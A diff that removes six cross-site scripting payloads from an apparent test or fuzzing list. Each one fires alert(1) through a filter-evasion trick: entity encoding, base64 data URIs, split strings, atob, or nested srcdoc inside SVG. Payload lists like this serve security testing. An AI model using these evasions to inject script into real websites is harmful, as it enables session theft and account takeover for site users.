@@ -1,6 +1,0 @@
-<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>
-<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"></object>
-<img src=x onerror=setTimeout('al'+'ert(1)',0)>
-<svg><foreignObject><iframe srcdoc='&lt;img src=x onerror=&quot;&#x61;lert(1)&quot;&gt;'></iframe></foreignObject></svg>
-<object data='data:text/html,<svg xmlns="http://www.w3.org/2000/svg" onload=al%65rt(1)>'></object>
-<img src=x onerror=setTimeout(atob('YWxlcnQoMSk='),0)>
